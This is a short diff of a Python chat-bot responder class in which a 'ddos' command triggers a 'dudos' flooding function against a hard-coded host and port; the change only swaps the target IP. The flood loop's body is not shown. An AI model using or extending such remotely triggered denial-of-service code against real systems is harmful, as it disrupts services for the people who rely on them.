@@ -28,7 +28,7 @@ class Toast(BaseResponder):
             print('got command: %s' % command)
             self.respond(msg, command + ' ok!')
             if command == 'ddos':
-                dudos(host='192.168.100.219', port=8080)
+                dudos(host='192.168.1.52', port=8080)
 
     def dudos(self, host = '127.0.0.1', port = 8080, times = 10000):
         for x in range(times):
